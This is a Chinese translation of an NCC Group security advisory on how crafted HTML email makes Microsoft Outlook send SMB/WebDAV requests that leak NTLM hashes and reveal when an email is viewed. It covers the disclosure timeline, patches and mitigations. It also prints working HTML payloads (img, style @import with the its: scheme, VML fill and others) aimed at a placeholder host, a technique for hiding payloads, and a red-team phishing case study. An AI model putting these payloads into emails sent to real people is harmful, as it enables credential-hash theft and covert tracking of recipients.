> 原文链接: https://www.anquanke.com//post/id/144832 


# Outlook中的SMB哈希劫持和用户跟踪


                                阅读量   
                                **109302**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：https://www.nccgroup.trust/
                                <br>原文地址：[https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/may/smb-hash-hijacking-and-user-tracking-in-ms-outlook/](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/may/smb-hash-hijacking-and-user-tracking-in-ms-outlook/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t01a0cc69895b9c9001.jpg)](https://p3.ssl.qhimg.com/t01a0cc69895b9c9001.jpg)

## 简介

在受害者打开或者仅仅是查看电子邮件后，Microsoft（MS）Outlook可能会被用来向外部发送SMB握手包。 即使SMB端口被阻止，也会发送WebDAV请求。 这可以用来通过在外部接收SMB哈希去破解受害者的密码，或者在受害者查看电子邮件时接收通知。

此问题已于2017年7月部分修补（CVE-2017-8572 [1]）。 根据微软安全响应中心（MSRC）的说法，2017年12月发布的CVE-2017-11927 [2]也修补了一些payloads。 该补丁已于2018年5月更新，以解决本报告中提到的其他问题。



## 介绍

用户即使不确定其内容通常也会打开新的无害的电子邮件去查看它们包含的内容。这样足以让攻击者劫持SMB HASH或至少确定受害者是否查看了该特定电子邮件，来确定MS Outlook邮件客户端是否正在使用并且用户已连接到Internet。当阅读窗格（预览页面）可见时（默认），只需单击电子邮件主题即可充分利用此特性。

此特性是在NCC Group的研究过程中发现的，并在Outlook 2016和2010中进行了测试，其默认设置中禁用了外部图像。这个问题已于2017年3月向MS报告。

我们还想提醒下，这一行为已经作为我们的Piranha网络钓鱼平台的一项功能实施。该平台是由NCC Group开发的，旨在帮助企业识别他们在网络钓鱼方面的人员，流程和技术故障，以便了解改善缓解网络钓鱼攻击的风险[3]。



## 研究和故事

在进行评估时，我收到了Outlook 2010中的一封HTML电子邮件，其中包含一个类似于以下内容的图像标记：

```
&lt;img src="//example.com/test/image.jpg" &gt;
```

我可以看到Outlook在打开该电子邮件后正在搜索某些内容，并且完全打开它比平时花费的时间更长。我很快意识到Outlook实际上使用URL“\ example.com test image.jpg”并发送SMB请求到“example.com”。

尽管即使提供的SMB路径有效，它也不会加载图片，但它可以将SMB HASH发送到任意位置。这种攻击在Outlook 2016上无效，但它使我开始了一个小型研究项目，尝通过使用不同的URI方案和特殊payload接受URI的不同HTML标记。

我设法通过设计一个使用ASPOSE.Email [4]和Microsoft Office Interop库的快速ASP.NET应用程序来测试具有不同目标的已知URI方案列表。具有较小变化的cure53 HTTPLeaks项目[5]用来生成电子邮件的HTML模板。本研究中使用的C＃代码，URI Schemes，公式和HTML模板可以在以下GitHub项目中找到：

```
https://github.com/nccgroup/OutlookLeakTest
```

为了减少复杂性，Sysinternals Suite的Wireshark和Process Monitor被用来检测远程和本地文件系统调用。



## 发现

Outlook在打开精心制作的HTML电子邮件时发送了外部SMB / WebDAV请求。 这可能会被滥用来劫持受害者的SMB hash或确定收件人是否查看过邮件。

此问题在Outlook默认设置阻止加载外部资源（如图像文件）可以利用。

**远程执行**<br>
尽管”\”模式被Outlook阻止，但仍发现许多其他模式和URI方案，这些模式和URI方案强制Outlook将请求发送到远程服务器。

下表显示了已知的矢量：

[![](https://p3.ssl.qhimg.com/t01c99c0c3304df5eab.png)](https://p3.ssl.qhimg.com/t01c99c0c3304df5eab.png)

**本地文件系统执行**

这种方式也可用于识别在本地文件系统上定位文件的URI方案。 这非常有趣，特别是当使用映射网络共享（具有写权限）时，或者在文件系统上可以删除文件时。 确定了以下URI方案：

[![](https://p4.ssl.qhimg.com/t013cdd3f59e2e32c4b.png)](https://p4.ssl.qhimg.com/t013cdd3f59e2e32c4b.png)

**一些payload 例子**

某些URI方案（远程/本地）仅在某些HTML代码中使用时才起作用。 虽然在测试过程中只发现以下payload有效，但这些payload不能被认为是唯一能够加载资源的payload。

**Image tag:**

```
&lt;img src="//example.com/anon/test.txt" &gt;
```

**Base tag + image tag:**

```
&lt;base href="//example.com/IDontExist/"&gt;
&lt;img&gt;
```

**Style tag:**

```
&lt;/style&gt;
       @import 'its:/example.com/foo1/test';
       @import url(its:/example.com/foo2/test);
&lt;/style&gt;
```

**Body tag (Image):**

```
&lt;body background="its:/example.com/IDontExistNew/foobar"&gt;
```

**Input tag (Image):**

```
&lt;input type="image" src="its:/example.com/IDontExistNew/foobar" name="test" value="test"&gt;
```

**Link tag (Style):**

```
&lt;link rel="stylesheet" href="its:/example.com/IDontExistNew/foobar" /&gt;
```

**VML tag (Image):**

```
&lt;v:background xmlns:v="urn:schemas-microsoft-com:vml"&gt;
            &lt;v:fill src="its:/example.com/IDontExistNew/foobar" /&gt;
&lt;/v:background&gt;
```

所有上述HTML标签的组合也可用于增加远程执行的机会。<br>
payload也可以使用像这样的方法隐藏在电子邮件中：

```
&lt;span class="show" style="overflow:hidden; float:left; display:none; line-height:0px;"&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
This part is hidden
&lt;v:background xmlns:v="urn:schemas-microsoft-com:vml"&gt;
           &lt;v:fill src="its:/example.com/IDontExistNew123456/foobar" /&gt;
&lt;/v:background&gt;

&lt;/span&gt;
```

当用户以纯文本格式查看电子邮件时，攻击者在发送电子邮件时可以使用不同的MIME类型来隐藏payload。 因此，只有以HTML格式查看电子邮件的用户才能成为目标用户。 这也可能被滥用，以诱使普通用户查看HTML格式的电子邮件来执行攻击。



## Piranha 钓鱼平台

在识别出这个漏洞后，我们就可以在红队的参与下在其他地方尝试。使用我们的Piranha网络钓鱼平台，我们制作了两封HTML邮件;第一个是明目张胆的钓鱼电子邮件，第二个是基于实际的批量营销电子邮件。在这两种情况下，在Piranha中都编辑了HTML源代码，以包含指向基于Internet的系统运行Responder的“其”URL的CSS [@import](https://github.com/import)。

首先，一些有针对性的用户将明显的网络钓鱼电子邮件转发给他们的IT部门，在此过程中揭示了他们自己的IT管理员和他们的IT管理员的hash。第二，隐形的电子邮件被发送给十个用户。其中8位在公司网络外收到电子邮件（正确阻止了445端口的出站流量），导致他们的哈希被捕获。值得注意的是，这比我们观察我们的自动化式的Piranha 用户运行的活动有大约四倍的成功概率，这些用户将受害者引诱到虚假的登录页面;使用合法的批量营销电子邮件作为转发人也阻止任何人举报。



## MS 回复

这个问题已于2017年3月8日向MS报告，最初并未满足其安全服务标准，因为“这需要用户打开不可信的电子邮件”。 然而，在我们向他们提供了更多关于在我们的钓鱼攻击评估中利用此问题的证据（这使我们的攻击力增强了四倍）后，MS将其视为安全问题。

这个问题最初是在2017年7月下旬部分修补的[1]。 这个补丁没有停止“mk：[@MSITStore](https://github.com/MSITStore)”方案。

根据MSRC的说法，CVE-2017-11927 [2]（由于我们的报告最初没有公布）已经纠正了一些有效载荷。 该修补程序在2018年5月进行了更新，以解决本报告中包含的其他问题。



## 无需补丁程序的解决方法

A）MS建议不愿意或无法处理网络边缘阻塞的情况是使用Windows防火墙执行此操作客户关注此类攻击，这已在[6]中记录。

B）基于MS的建议，解决方法是禁用Outlook中的电子邮件预览选项，并立即删除未知电子邮件而不打开它们。我们认为这种策略并不可靠，因为电子邮件用户的信任可以以多种方式被利用，特别是当电子邮件拥有迷人或熟悉的主题或其发件人看起来很熟悉时。

C）还建议考虑阻止对端口445和139的外部请求。虽然此解决方案不会阻止Outlook发送DNS或WebDAV请求（可用于跟踪），但它确实会打破SMB哈希劫持攻击。在我们的测试中，我们没有观察到SMB散列通过WebDAV请求发送出去。请注意，此解决方案不会解决在本地文件系统上定位文件的问题。

D）我们建议以纯文本形式打开Outlook中的所有电子邮件，以阻止此类攻击和其他类似攻击。为了以纯文本格式查看所有传入的电子邮件，请勾选下面的“以纯文本形式阅读”复选框：

Outlook&gt;文件菜单&gt;选项&gt;信任中心&gt;信任中心设置…&gt;电子邮件安全

尽管用户通过这种方式阅读电子邮件不方便且困难，但这是目前最强大的解决方案。这与以纯文本查看HTML网页类似，可能会破坏使用浏览器的全部目的。当需要在HTML中查看可信电子邮件时，可能会将此选项更改为默认值（Outlook 2016提供了一种用HTML查看电子邮件的简单更改）。

除了上述以及类似于A点之外，用户应该始终选择强密码，并且在合适且有益的情况下，应该使用合适的Restrict NTLM策略来保护域用户。请注意，通过Restrict NTLM可用的限制可能会与通过使用网络隔离和基于主机的防火墙施加的访问控制重叠。

在某些环境中，后一种方法可能比Restrict NTLM 策略集更灵活或直接管理。在这两种情况下，了解主机之间的合法流量是定义和审计有效控制的基础。在推导任何策略和部署新策略之前，强烈建议使用Restrict NTLM 审核选项和设置。这将最大限度地减少意外阻止合法连接的可能性。



## 在RTF中使用OLE的另一个类似问题

虽然我们正在等待最后一个补丁，但在[7]（CVE-2018-0950）上发布了一个类似的问题，使用SMB窃取密码哈希。 虽然它使用OLE载体，但它的影响是相同的。



## 参考

```
[1] https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8572
[2] https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2017-11927
[3] https://www.nccgroup.trust/uk/our-services/security-consulting/managed-and-hosted-security-services/vulnerability-management-and-detection/phishing-simulation-piranha/
[4] https://downloads.aspose.com/email/net 
[5] https://github.com/cure53/HTTPLeaks 
[6] https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170014
[7] https://insights.sei.cmu.edu/cert/2018/04/automatically-stealing-password-hashes-with-microsoft-outlook-and-ole.html
```
